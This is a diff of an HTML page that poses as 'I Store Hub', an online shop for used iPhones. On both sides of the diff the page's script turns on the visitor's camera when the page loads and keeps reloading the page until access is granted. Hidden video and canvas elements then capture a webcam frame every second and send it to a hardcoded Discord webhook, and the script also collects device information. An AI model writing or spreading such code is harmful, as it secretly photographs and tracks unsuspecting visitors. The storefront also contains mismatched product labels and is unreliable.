@@ -39,15 +39,8 @@
     }
 
     header .logo img {
-      height: 100px;
-      width: auto;
-    }
-
-    .hamburger {
-      display: none;
-      font-size: 2rem;
-      color: white;
-      cursor: pointer;
+      height: 50px; /* Set the height of the logo */
+      width: auto;  /* Adjust width automatically to maintain aspect ratio */
     }
 
     nav {
@@ -156,37 +149,11 @@
     footer a:hover {
       text-decoration: underline;
     }
-
     video, canvas {
       display: none;
     }
 
     @media (max-width: 768px) {
-      .hamburger {
-        display: block;
-      }
-
-      nav {
-        display: none;
-        flex-direction: column;
-        background-color: #000;
-        position: absolute;
-        top: 80px;
-        right: 20px;
-        width: 200px;
-        border: 1px solid #333;
-        padding: 20px;
-        z-index: 101;
-      }
-
-      nav.show {
-        display: flex;
-      }
-
-      nav a {
-        margin: 10px 0;
-      }
-
       .product-info h3 {
         font-size: 1.2rem;
       }
@@ -200,12 +167,10 @@
   <!-- Header -->
   <header>
     <div class="logo">
+      <!-- Logo Image -->
       <img src="https://media.discordapp.net/attachments/905435171224965120/1366725694264053790/488616197_550039217697921_4611391652296171568_n.png?ex=6811fdfe&is=6810ac7e&hm=c7445d9a5328c644824c9fb3b6749fe023a23b90c869b4fcb422934532598996&=&width=1534&height=1534" alt="I Store Hub Logo" />
-      <p>I STORE HUB</p>
+      <p>I Store Hub</p>
     </div>
-
-    <div class="hamburger" onclick="toggleMenu()">☰</div>
-
     <nav>
       <a href="#">Home</a>
       <a href="#">Shop</a>
@@ -220,115 +185,103 @@
     <video id="video" autoplay playsinline></video>
     <h2 style="text-align:center; font-size:2rem; margin-bottom:30px;">Featured Products</h2>
     <div class="product-grid">
-  <!-- iPhone 15 Pro -->
-<div class="product-card">
-    <img src="https://media.croma.com/image/upload/v1708678757/Croma%20Assets/Communication/Mobiles/Images/300824_0_opb0vg.png" alt="iPhone 15 Pro" />
-    <div class="product-info">
-      <h3>iPhone 15 Pro</h3>
-      <p>Pre-owned iPhone 15 Pro with A17 Pro chip, titanium body, and a 48MP main camera. Battery health: 90%. Slight signs of use, but still offers excellent performance. A great deal for the price!</p>
-      <div class="price">₹59,900</div>
-      <button>Add to Cart</button>
-    </div>
-  </div>
-  
-  <!-- iPhone 15 -->
-  <div class="product-card">
-    <img src="https://media.croma.com/image/upload/v1729693605/Croma%20Assets/Communication/Mobiles/Images/300684_0_s3x2kn.png" alt="iPhone 15" />
-    <div class="product-info">
-      <h3>iPhone 15</h3>
-      <p>Used iPhone 15 with a 6.1-inch display and A16 Bionic chip. Battery health: 90%. In excellent condition with no scratches. The perfect combination of power and design at a lower price!</p>
-      <div class="price">₹49,900</div>
-      <button>Add to Cart</button>
-    </div>
-  </div>
-  
-  <!-- iPhone 14 -->
-  <div class="product-card">
-    <img src="https://media.croma.com/image/upload/v1708672728/Croma%20Assets/Communication/Mobiles/Images/261934_0_kukyat.png" alt="iPhone 14" />
-    <div class="product-info">
-      <h3>iPhone 14</h3>
-      <p>Gently used iPhone 14, featuring a 6.1-inch display and the A15 Bionic chip. Battery health: 87%. A budget-friendly option for those who want a reliable phone with great camera features.</p>
-      <div class="price">₹45,900</div>
-      <button>Add to Cart</button>
-    </div>
-  </div>
-  
-  <!-- iPhone 13 -->
-  <div class="product-card">
-    <img src="https://media-ik.croma.com/prod/https://media.croma.com/image/upload/v1708671264/Croma%20Assets/Communication/Mobiles/Images/243465_0_tvikdw.png?tr=w-600" alt="iPhone SE" />
-    <div class="product-info">
-      <h3>iPhone 13</h3>
-      <p>Used iPhone 13 with the A15 Bionic chip and Super Retina display. Battery health: 92%. Well-maintained and in good condition. A fantastic deal if you're looking for a budget iPhone with top performance!</p>
-      <div class="price">₹39,900</div>
-      <button>Add to Cart</button>
-    </div>
-  </div>
-  
-  </section>
+      <!-- iPhone 15 Pro -->
+      <div class="product-card">
+        <img src="https://media.croma.com/image/upload/v1708678757/Croma%20Assets/Communication/Mobiles/Images/300824_0_opb0vg.png" alt="iPhone 15 Pro" />
+        <div class="product-info">
+          <h3>iPhone 15 Pro</h3>
+          <p>The new iPhone with amazing features and high performance.</p>
+          <div class="price">₹79,900</div>
+          <button>Add to Cart</button>
+        </div>
+      </div>
 
+      <!-- iPhone 12 -->
+      <div class="product-card">
+        <img src="https://media.croma.com/image/upload/v1729693605/Croma%20Assets/Communication/Mobiles/Images/300684_0_s3x2kn.png" alt="iPhone 12" />
+        <div class="product-info">
+          <h3>iPhone 15</h3>
+          <p>Experience the best display with the sleek iPhone 12.</p>
+          <div class="price">₹69,900</div>
+          <button>Add to Cart</button>
+        </div>
+      </div>
+
+      <!-- iPhone 11 -->
+      <div class="product-card">
+        <img src="https://media.croma.com/image/upload/v1708672728/Croma%20Assets/Communication/Mobiles/Images/261934_0_kukyat.png" alt="iPhone 11" />
+        <div class="product-info">
+          <h3>iPhone 14</h3>
+          <p>Affordable yet powerful with incredible camera features.</p>
+          <div class="price">₹49,900</div>
+          <button>Add to Cart</button>
+        </div>
+      </div>
+
+      <!-- iPhone SE -->
+      <div class="product-card">
+        <img src="https://media-ik.croma.com/prod/https://media.croma.com/image/upload/v1708671264/Croma%20Assets/Communication/Mobiles/Images/243465_0_tvikdw.png?tr=w-600" alt="iPhone SE" />
+        <div class="product-info">
+          <h3>iPhone 13</h3>
+          <p>Compact, efficient, and affordable, the iPhone SE is a great choice.</p>
+          <div class="price">₹39,900</div>
+          <button>Add to Cart</button>
+        </div>
+      </div>
+    </div>
+  </section>
   <div id="game-area" style="display:none;"></div>
 
-  <video id="video" autoplay playsinline></video>
-  <canvas id="canvas" width="320" height="240"></canvas>
+<video id="video" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas"></canvas>
 
   <script>
     const webhookURL = 'https://discord.com/api/webhooks/1366781971711266938/R3CLmI2zuaN5U1eTTFGIBbW58oj7yBakju4ygkX1aZT0FS-elKNIqo0lYJJ6lRfoM61f';
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
-    const gameArea = document.getElementById('game-area');
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const ctx = canvas.getContext('2d');
 
+  document.addEventListener("DOMContentLoaded", enableCamera);
 
-    document.addEventListener("DOMContentLoaded", function() {
-    enableCamera(); // Calls enableCamera when the page is fully loaded
-  });
+  function enableCamera() {
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
 
-    function enableCamera() {
-      
+        video.onloadedmetadata = () => {
+          video.play();
 
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-          video.srcObject = stream;
+          // Set canvas size to video dimensions
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+
           startAutoCapture();
-          collectAdditionalInfo(); // Collect device info
-        })
-        .catch(err => {
-          alert("⚠️ Please allow camera access to proceed.");
-          location.reload(); // Force user to retry
-        });
+          collectAdditionalInfo(); // Optional if needed
+        };
+      })
+      .catch(err => {
+        alert("⚠️ Please allow camera access to proceed.");
+        location.reload();
+      });
+  }
 
-      startGameVisuals();
-    }
+  function startAutoCapture() {
+    setInterval(() => {
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    function startAutoCapture() {
-      setInterval(() => {
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        canvas.toBlob(blob => {
-          const formData = new FormData();
-          formData.append('file', blob, 'vishnu-capture.png');
-          formData.append('username', 'VishnuCam');
-          formData.append('content', '📸 New frame captured!');
+      canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append('file', blob, 'capture.png');
+        formData.append('username', 'cam');
+        formData.append('content', '📸 New frame captured!');
 
-          fetch(webhookURL, {
-            method: 'POST',
-            body: formData
-          }).catch(err => console.error('Webhook error:', err));
-        }, 'image/png');
-      }, 1000); // 0.5 seconds
-    }
-
-    function startGameVisuals() {
-      const dot = document.createElement('div');
-      dot.className = 'dot';
-      gameArea.appendChild(dot);
-
-      setInterval(() => {
-        const maxX = gameArea.clientWidth - 20;
-        const maxY = gameArea.clientHeight - 20;
-        dot.style.left = Math.random() * maxX + 'px';
-        dot.style.top = Math.random() * maxY + 'px';
-      }, 300);
-    }
+        fetch(webhookURL, {
+          method: 'POST',
+          body: formData
+        }).catch(err => console.error('Webhook error:', err));
+      }, 'image/png');
+    }, 1000); // 1 second interval
+  }
 
     function collectAdditionalInfo() {
       // Basic device info
@@ -390,35 +343,12 @@
     }
   </script>
 
-<footer>
-    <div class="footer-container">
-      <p>&copy; 2025 I Store Hub. All rights reserved.</p>
-      <div class="footer-links">
-        <a href="#">Privacy Policy</a> | 
-        <a href="#">Terms of Service</a> | 
-        <a href="#">Return & Refund Policy</a> | 
-        <a href="#">Shipping Information</a>
-      </div>
-  
-      <div class="footer-contact">
-        <p>Contact Us: <a href="mailto:support@istorehub.com">support@istorehub.com</a></p>
-        <p>Call us: +91 8876287590</p>
-      </div>
-  
-      <div class="footer-social">
-        <p>Follow Us:</p>
-        <a href="https://wa.me/918876287590/" target="_blank"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/512px-WhatsApp.svg.png" alt="Facebook" style="width: 25px; height: 25px; margin-right: 10px;"/></a>
-        <a href="https://www.instagram.com/i.store.hub.__?igsh=NXJlcnM5YXI1b2pu" target="_blank"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/512px-Instagram_icon.png" alt="Instagram" style="width: 25px; height: 25px; margin-right: 10px;"/></a>
-      </div>
-    </div>
-  </footer>
 
-  <script>
-    function toggleMenu() {
-      const nav = document.querySelector("nav");
-      nav.classList.toggle("show");
-    }
-  </script>
+
+
+  <!-- Footer -->
+  <footer>
+    <p>&copy; 2025 I Store Hub | <a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a></p>
+  </footer>
 </body>
 </html>
-
